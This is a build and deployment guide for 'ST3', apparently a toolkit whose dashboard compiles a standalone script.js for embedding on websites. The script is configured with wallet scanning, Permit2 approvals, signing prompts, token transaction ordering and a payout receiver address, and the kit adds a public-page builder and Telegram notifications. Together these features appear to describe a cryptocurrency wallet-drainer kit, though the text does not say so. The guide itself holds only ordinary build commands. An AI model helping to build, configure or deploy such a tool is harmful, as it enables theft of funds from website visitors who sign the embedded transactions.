# ST3 Complete Build Guide

This guide covers a complete ST3 setup from a fresh checkout through local development, script compilation, production verification, and deployment.

## 1. Prerequisites

Install these tools:

- Node.js 22 or newer
- npm 10 or newer
- Git
- Docker Desktop or Docker Engine with Compose for Redis, Kafka, and the indexer

Confirm the toolchain:

```bash
node --version
npm --version
git --version
docker --version
docker compose version
```

## 2. Checkout and Install

```bash
git clone <repository-url> St3
cd St3
npm ci --legacy-peer-deps
```

`npm ci` installs the locked dependency versions from `package-lock.json`.

## 3. Configure the Environment

Create the local environment file from the production template:

```bash
cp .env.production.template .env.local
```

Fill the values relevant to the selected deployment. Core development values include:

```dotenv
NEXT_PUBLIC_BASE_URL=http://localhost:3000
NEXT_PUBLIC_APP_URL=http://localhost:3000
AUTH_SECRET=<32-byte-hex-value>
ENCRYPTION_KEY=<32-byte-hex-value>
ADMIN_PANEL_PASSWORD=<strong-password>
OWNER_ADDRESS=0x...
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=<reown-project-id>
NEXT_PUBLIC_PROJECT_ID=<reown-project-id>
REDIS_URL=redis://localhost:6379
ETHEREUM_RPC_URL=<ethereum-rpc-url>
```

Generate application secrets:

```bash
openssl rand -hex 32
openssl rand -hex 32
openssl rand -base64 24
```

Contract addresses and optional integrations are documented in `.env.production.template` and `DEPLOYMENT.md`.

## 4. Start Infrastructure

The complete local stack includes Redis, Kafka, Zookeeper, and the blockchain indexer:

```bash
docker compose up -d redis zookeeper kafka indexer
docker compose ps
```

For a lightweight web-only session, set the project’s supported local fallback variables and run the application directly.

## 5. Run the Dashboard

```bash
npm run dev
```

The development launcher selects the first free port beginning at `3000` and prints the final URL. Open these routes as needed:

- `/login` — administrator access
- `/compile` — standalone script compiler
- `/contract` — ABI and contract configuration
- `/permit2` — Permit2 workflow
- `/strategy` — execution strategy configuration
- `/frontpage` — public-page builder
- `/api/health` — service status

## 6. Configure the Build in the Dashboard

Complete the compiler tabs in this order:

1. **General:** choose ecosystem, CSS selectors, labels, and theme.
2. **Wallet:** choose supported wallets, networks, scanning, and connection behavior.
3. **Modal:** select WalletConnect, Reown, Web3Modal, RainbowKit, Sequence, or Custom and enter the matching project credentials.
4. **Tokens:** configure token support and transaction ordering.
5. **Advanced:** configure retries, signing prompts, logging, caching, and workflow progression.
6. **Payout:** enter the receiver address and chain.
7. **Transaction:** choose the transaction function and execution strategy.
8. **Compile:** generate and inspect the standalone JavaScript.

The saved configuration is stored in `data/compile-config.json`. Shared execution settings are stored in `data/operational-config.json`.

## 7. Generate the Standalone Script

Use the dashboard Compile button, or compile the saved dashboard configuration from the command line while the dev server is running:

```bash
PORT=3000 npm run compile:sdk
```

Synchronize a static generated bundle directly:

```bash
npm run sdk:sync
```

Generated builds are published under `public/generated-scripts/`. The compiler also provides:

- inline JavaScript copy
- `script.js` download
- website ZIP download
- published script URL

Add the result to a website:

```html
<script src="/path/to/script.js"></script>
<div data-sv26-button></div>
```

The selected wallet framework opens first. The configured transaction flow, contracts, strategy, and receiver address are embedded in the compiled configuration.

## 8. Run Verification

Execute the complete quality sequence:

```bash
npm test -- --run
npx tsc --noEmit
npm run lint
npm run build
```

Useful focused commands:

```bash
npm run test:watch
npm run test:coverage
npx vitest run test/universal-sdk-generator.test.ts
npx vitest run test/compile-validation.test.ts
```

After the production build, verify the application locally:

```bash
npm run start
curl http://localhost:3000/api/health
```

## 9. Run Background Workers

Start every worker together:

```bash
npm run workers
```

Start individual workers when isolating a service:

```bash
npm run worker:compile
npm run worker:relay
npm run worker:notify
npm run worker:telegram
```

Register the Telegram webhook after the public HTTPS URL and Telegram variables are configured:

```bash
npm run telegram:webhook
```

## 10. Production with Docker Compose

Build and launch the full production stack:

```bash
docker compose -f docker-compose.prod.yml up -d --build
docker compose -f docker-compose.prod.yml ps
docker compose -f docker-compose.prod.yml logs -f app
```

Select another host port while retaining port `3000` inside the application container:

```bash
APP_PORT=3010 docker compose --env-file .env.local -f docker-compose.prod.yml up -d --build
```

Set `INDEXER_RPC_URL` when the indexer should use a dedicated authenticated endpoint. The Compose stack includes a public Ethereum RPC default for local startup.

The production stack provides the Next.js app, all BullMQ workers, Redis persistence, Kafka, Zookeeper, and the indexer. Persistent volumes retain application data, generated scripts, compiled build artifacts, Redis records, and Kafka events.

Validate the deployment:

```bash
curl http://127.0.0.1:3000/api/health
docker compose -f docker-compose.prod.yml exec redis redis-cli ping
```

Connect Nginx and HTTPS using `deploy/nginx.conf` and the steps in `deploy/SETUP_VPS.md`.

## 11. Railway Deployment

Create a Railway project with these services:

1. Web service using the root `Dockerfile`
2. Redis service connected through `REDIS_URL`
3. Worker service using `npm run workers`
4. Persistent volume mounted for `data/` and `public/generated-scripts/`

Set the variables from `.env.production.template`, assign the public domain, and verify `/api/health`. Additional Railway guidance is available in `docs/railway-deployment.md`.

## 12. Final Release Checklist

- Environment variables are present in the deployment platform.
- Contract addresses match the intended networks.
- Wallet framework credentials match the production domain.
- Receiver and execution strategy settings match the approved configuration.
- Redis, Kafka, workers, and indexer report healthy status.
- The full test suite, type check, lint, and production build complete successfully.
- The generated `script.js` opens the selected wallet modal and follows the selected transaction flow.
- Downloaded JavaScript, inline output, website ZIP, and published URL are verified.
- `/api/health` returns a healthy production response.
